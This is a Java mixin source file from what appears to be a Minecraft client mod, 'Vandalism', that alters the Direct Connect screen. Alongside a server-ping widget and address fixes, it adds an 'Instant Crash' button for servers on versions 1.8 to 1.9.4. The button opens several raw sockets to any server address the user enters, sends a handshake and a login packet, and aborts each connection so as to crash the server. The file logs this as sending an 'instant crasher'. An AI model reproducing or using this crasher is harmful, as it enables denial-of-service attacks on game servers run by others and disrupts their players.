/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.injection.mixins.clientsetting;

import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
import de.florianmichael.viafabricplus.protocoltranslator.ProtocolTranslator;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.clientsettings.impl.EnhancedServerListSettings;
import de.nekosarekawaii.vandalism.integration.serverlist.ServerPingerWidget;
import de.nekosarekawaii.vandalism.util.*;
import net.minecraft.client.font.TextRenderer;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.multiplayer.DirectConnectScreen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.text.Text;
import net.minecraft.util.Pair;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.Unique;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.Redirect;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.DataOutputStream;
import java.net.Socket;

@Mixin(DirectConnectScreen.class)
public abstract class MixinDirectConnectScreen extends Screen {

    @Shadow
    private TextFieldWidget addressField;

    @Unique
    private final MSTimer vandalism$pingTimer = new MSTimer();

    @Unique
    private String vandalism$lastAddress = "";

    @Unique
    private ButtonWidget vandalism$instantCrashButton;

    protected MixinDirectConnectScreen(final Text ignored) {
        super(ignored);
    }

    @Inject(method = "init", at = @At("RETURN"))
    private void addInstantCrashButton(final CallbackInfo ci) {
        final EnhancedServerListSettings enhancedServerListSettings = Vandalism.getInstance().getClientSettings().getEnhancedServerListSettings();
        if (enhancedServerListSettings.enhancedServerList.getValue() && enhancedServerListSettings.directConnectInstantCrashButton.getValue()) {
            final ProtocolVersion targetVersion = ProtocolTranslator.getTargetVersion();
            this.vandalism$instantCrashButton = this.addDrawableChild(ButtonWidget.builder(Text.literal("Instant Crash (1.8.0 - 1.9.4)"), button -> {
                final String address = this.addressField.getText();
                if (!address.isEmpty()) {
                    new Thread(() -> {
                        final Pair<String, Integer> serverAddress = ServerUtil.resolveServerAddress(address);
                        final String ip = serverAddress.getLeft();
                        final int port = serverAddress.getRight();
                        final String username = RandomUtils.randomString(MinecraftConstants.MIN_USERNAME_LENGTH, MinecraftConstants.MAX_USERNAME_LENGTH, true, true, true, false);
                        final int connections = 3;
                        final int protocolId = targetVersion.getVersion();
                        for (int i = 0; i < connections; ++i) {
                            try {
                                final Socket connection = new Socket(ip, port);
                                connection.setTcpNoDelay(true);
                                final DataOutputStream output = new DataOutputStream(connection.getOutputStream());
                                PacketHelper.writePacket(PacketHelper.createHandshakePacket(protocolId, ip, port), output);
                                PacketHelper.writePacket(PacketHelper.createLoginPacket(protocolId, username), output);
                                connection.setSoLinger(true, 0);
                                connection.close();
                                Vandalism.getInstance().getLogger().info("Sent instant crasher to {}:{} with username {}", ip, port, username);
                            } catch (final Exception ignored) {
                            }
                        }
                    }).start();
                }
            }).dimensions(this.width / 2 - 100, this.height / 4 + 96 + 12 - 24, 200, 20).build());
            this.vandalism$instantCrashButton.active = targetVersion.betweenInclusive(ProtocolVersion.v1_8, ProtocolVersion.v1_9_3) && !this.addressField.getText().isEmpty();
        }
    }

    @Inject(method = "render", at = @At(value = "RETURN"))
    private void drawServerPingerWidget(final DrawContext context, final int mouseX, final int mouseY, final float delta, final CallbackInfo ci) {
        final String address = this.addressField.getText();
        if (address.isEmpty()) return;
        ServerPingerWidget.draw(new ServerInfo(address, address, ServerInfo.ServerType.OTHER), context, mouseX, mouseY, delta, 30);
    }

    @Redirect(method = "render", at = @At(value = "INVOKE", target = "Lnet/minecraft/client/gui/DrawContext;drawCenteredTextWithShadow(Lnet/minecraft/client/font/TextRenderer;Lnet/minecraft/text/Text;III)V"))
    private void removeTitle(final DrawContext instance, final TextRenderer textRenderer, final Text text, final int centerX, final int y, final int color) {
        final EnhancedServerListSettings enhancedServerListSettings = Vandalism.getInstance().getClientSettings().getEnhancedServerListSettings();
        if (enhancedServerListSettings.enhancedServerList.getValue() && enhancedServerListSettings.serverPingerWidget.getValue()) {
            return;
        }
        instance.drawCenteredTextWithShadow(textRenderer, text, centerX, y, color);
    }

    @Inject(method = "onAddressFieldChanged", at = @At(value = "RETURN"))
    private void resetPingTimer(final CallbackInfo ci) {
        final EnhancedServerListSettings enhancedServerListSettings = Vandalism.getInstance().getClientSettings().getEnhancedServerListSettings();
        if (enhancedServerListSettings.enhancedServerList.getValue() && enhancedServerListSettings.serverPingerWidget.getValue()) {
            this.vandalism$pingTimer.reset();
        }
    }

    @Override
    public void tick() {
        super.tick();
        final EnhancedServerListSettings enhancedServerListSettings = Vandalism.getInstance().getClientSettings().getEnhancedServerListSettings();
        if (enhancedServerListSettings.enhancedServerList.getValue()) {
            String address = this.addressField.getText();
            this.vandalism$instantCrashButton.active = ProtocolTranslator.getTargetVersion().betweenInclusive(ProtocolVersion.v1_8, ProtocolVersion.v1_9_3) && !address.isEmpty();
            if (address != null && !address.isBlank()) {
                if (enhancedServerListSettings.directConnectAddressFix.getValue()) {
                    final String oldAddress = address;
                    address = ServerUtil.fixAddress(address);
                    if (!oldAddress.equals(address)) {
                        this.addressField.setText(address);
                    }
                }
                if (enhancedServerListSettings.serverPingerWidget.getValue()) {
                    if (this.vandalism$pingTimer.hasReached(1000, true)) {
                        if (address.equals(this.vandalism$lastAddress)) return;
                        this.vandalism$lastAddress = address;
                        ServerPingerWidget.ping(new ServerInfo(address, address, ServerInfo.ServerType.OTHER));
                        this.vandalism$pingTimer.reset();
                    }
                }
            }
        }
    }

}
